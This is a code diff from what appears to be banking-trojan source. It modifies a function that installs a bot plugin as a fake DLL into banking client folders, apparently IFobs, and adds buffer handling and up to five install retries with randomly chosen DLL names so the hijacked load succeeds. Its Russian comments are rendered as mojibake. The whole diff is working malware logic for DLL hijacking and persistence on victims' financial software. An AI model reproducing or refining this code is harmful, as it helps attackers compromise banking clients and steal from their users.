@@ -719,21 +719,33 @@ DWORD WINAPI IntallFakeDll(void*)
 	{
 		char folderClient[MAX_PATH];
 		bool installed = false;
-		for( int i = 0; i < clients.Count(); i++ )
+		//выдел€ем место дл€ бот плага
+		BYTE* botData = (BYTE*)MemAlloc( bot.Size() );
+		if( botData )
 		{
-			m_lstrcpy( folderClient, clients[i].t_str() );
-			pPathRemoveFileSpecA(folderClient);
-			DWORD rand = (DWORD)pGetTickCount();
-			pPathAppendA( folderClient, dlls[ rand % ARRAYSIZE(dlls) ] );
-			if( install( folderClient, (LPBYTE)bot.Data(), bot.Size()) )
+			for( int i = 0; i < clients.Count(); i++ )
 			{
-				DBG("IFobs", "»нстал€ци€ fake.dll дл€ '%s' успешно выполнена", clients[i].t_str() );
-				installed = true;
+				m_lstrcpy( folderClient, clients[i].t_str() );
+				for( int j = 0; j < 5; j++ ) //делаем 5 попыток установки, ошибка в инстал€ции может быть из-за отсутстви€ нужной длл, на следующей попытке будет выбрана друга€
+				{
+					pPathRemoveFileSpecA(folderClient);
+					DWORD rand = (DWORD)pGetTickCount();
+					pPathAppendA( folderClient, dlls[ rand % ARRAYSIZE(dlls) ] );
+					m_memcpy( botData, bot.Data(), bot.Size() );
+					if( install( folderClient, botData, bot.Size()) )
+					{
+						DBG("IFobs", "»нстал€ци€ fake.dll дл€ '%s' успешно выполнена", clients[i].t_str() );
+						installed = true;
+						break;
+					}
+					else
+						DBG("IFobs", "»нстал€ци€ fake.dll дл€ '%s' не выполнена", clients[i].t_str() );
+				}
 			}
+			MemFree(botData);
 		}
 		if( installed )
 		{
-			BOT::SaveSettings(true, false, true);
 			Bot->CreateFileA( 0, GetStr(EStrFakeDllIFobsFlag).t_str() );
 		}
 	}
